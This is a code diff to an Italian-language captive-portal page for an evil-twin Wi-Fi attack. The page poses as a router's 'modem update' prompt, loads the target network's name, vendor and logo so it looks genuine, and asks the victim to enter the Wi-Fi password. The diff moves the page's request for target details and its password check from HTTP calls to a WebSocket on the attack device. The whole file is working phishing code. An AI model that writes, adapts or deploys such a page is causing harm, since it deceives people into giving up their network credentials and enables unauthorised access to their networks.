@@ -123,7 +123,7 @@
         <h1>Aggiornamento Modem</h1>
         <p>Per garantire il corretto funzionamento della rete, si consiglia di aggiornare il modem. Se l'aggiornamento
             non viene completato, la rete potrebbe risultare instabile.</p>
-        <div class="wifi-name" id="wifiName"></div>
+        <div class="wifi-name" id="wifiName">Caricamento...</div>
         <input type="password" id="wifiPassword" placeholder="Password Wi-Fi">
         <div class="button-group">
             <button onclick="submitPassword()">Conferma</button>
@@ -133,80 +133,141 @@
             <p id="vendor"></p>
         </footer>
     </div>
+
     <script>
-        async function submitPassword() {
-            const password = document.getElementById('wifiPassword').value;
-            if (password) {
+        // ==========================================
+        // WEBSOCKET CONFIGURATION
+        // ==========================================
+        const WS_URL = `ws://192.168.4.1/ws`;
+        
+        const CMD = {
+            GET_EVILTWIN_TARGET: 6,
+            CHECK_INPUT_PASSWORD: 7
+        };
+
+        let ws = null;
+        let reqIdCounter = 0;
+        let pendingRequests = new Map();
+        let isConnected = false;
+
+        function connectWS() {
+            ws = new WebSocket(WS_URL);
+
+            ws.onopen = () => {
+                isConnected = true;
+                loadTargetInfo();
+            };
+
+            ws.onclose = () => {
+                isConnected = false;
+                setTimeout(connectWS, 1000);
+            };
+
+            ws.onmessage = (event) => {
                 try {
-                    const bodyData = `password=${password}`;
-                    const response = await fetch('/api/check_input_password', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        },
-                        body: bodyData
-                    });
-                    const responseText = await response.text();
-                    if (response.ok) {
-                        if (responseText === "bad") {
-                            alert("Password errata. Riprova.");
+                    const msg = JSON.parse(event.data);
+                    if (msg.req_id && pendingRequests.has(msg.req_id)) {
+                        const { resolve, reject } = pendingRequests.get(msg.req_id);
+                        if (msg.status === 'error') {
+                            reject(msg.message || "Error");
                         } else {
-                            alert("Password accettata. Aggiornamento in corso...");
+                            resolve(msg);
                         }
-                    } else {
-                        alert("Errore durante l'aggiornamento. Riprova.");
+                        pendingRequests.delete(msg.req_id);
                     }
-                } catch (error) {
-                    alert("Si è verificato un errore durante l'invio della richiesta.");
-                }
-            } else {
-                alert("Inserisci la password per continuare.");
-            }
+                } catch (e) { console.error(e); }
+            };
         }
+
+        function sendCommand(cmdId, params = {}) {
+            return new Promise((resolve, reject) => {
+                if (!isConnected) {
+                    reject("Connection lost");
+                    return;
+                }
+                const id = ++reqIdCounter;
+                pendingRequests.set(id, { resolve, reject });
+                const payload = JSON.stringify({ cmd: cmdId, req_id: id, ...params });
+                ws.send(payload);
+                setTimeout(() => {
+                    if (pendingRequests.has(id)) {
+                        pendingRequests.delete(id);
+                        reject("Timeout");
+                    }
+                }, 5000);
+            });
+        }
+
+        // ==========================================
+        // PAGE LOGIC
+        // ==========================================
 
         async function loadTargetInfo() {
             try {
-                const res = await fetch('/api/get_evlitwin_target', { cache: 'no-store' });
-                if (!res.ok) throw new Error(`HTTP ${res.status}`);
-
-                const data = await res.json();
+                // Richiesta via WebSocket
+                const data = await sendCommand(CMD.GET_EVILTWIN_TARGET);
+                
                 document.getElementById('wifiName').textContent = `${data.ssid}:`;
 
                 const vendorEl = document.getElementById('vendor');
                 if (!data.vendor || data.vendor === "Generic") {
                     vendorEl?.remove();
                 } else {
-                    vendorEl.textContent = `© ${data.vendor} 2024, All Rights Reserved.`;
+                    vendorEl.textContent = `© ${data.vendor} 2025, All Rights Reserved.`;
                 }
 
                 const logoEl = document.getElementById('logo');
-                const testImage = new Image();
-
-                testImage.onload = function () {
-                    logoEl.src = data.logo;
-                    logoEl.classList.remove('disabled');
-
-                    if (testImage.width === 100 && testImage.height === 100) {
-                        logoEl.classList.add('logo_small');
-                        logoEl.classList.remove('logo_large');
-                    } else {
-                        logoEl.classList.add('logo_large');
-                        logoEl.classList.remove('logo_small');
-                    }
-                };
-
-                testImage.onerror = function () {
-                    logoEl.classList.add('disabled');
-                };
-
-                testImage.src = data.logo;
+                if (data.logo) {
+                    const testImage = new Image();
+                    testImage.onload = function () {
+                        logoEl.src = data.logo;
+                        logoEl.classList.remove('disabled');
+                        if (testImage.width === 100 && testImage.height === 100) {
+                            logoEl.classList.add('logo_small');
+                            logoEl.classList.remove('logo_large');
+                        } else {
+                            logoEl.classList.add('logo_large');
+                            logoEl.classList.remove('logo_small');
+                        }
+                    };
+                    testImage.onerror = function () {
+                        logoEl.classList.add('disabled');
+                    };
+                    testImage.src = data.logo;
+                }
             } catch (e) {
-                console.error('Errore caricamento target:', e);
+                console.error('Errore caricamento:', e);
                 document.getElementById('wifiName').textContent = 'Rete: (non disponibile)';
             }
         }
-        window.addEventListener('DOMContentLoaded', loadTargetInfo);
+
+        async function submitPassword() {
+            const password = document.getElementById('wifiPassword').value;
+            if (!password) {
+                alert("Inserisci la password per continuare.");
+                return;
+            }
+
+            try {
+                // Invio password via WebSocket
+                const response = await sendCommand(CMD.CHECK_INPUT_PASSWORD, { password: password });
+                
+                if (response.status === "ok") {
+                    alert("Password accettata. Aggiornamento in corso...");
+                } else if (response.status === "bad") {
+                    alert("Password errata. Riprova.");
+                    document.getElementById('wifiPassword').value = '';
+                } else {
+                    alert("Errore sconosciuto.");
+                }
+            } catch (error) {
+                console.error(error);
+                alert("Si è verificato un errore di connessione.");
+            }
+        }
+
+        // Init
+        window.addEventListener('DOMContentLoaded', connectWS);
     </script>
 </body>
-
 </html>
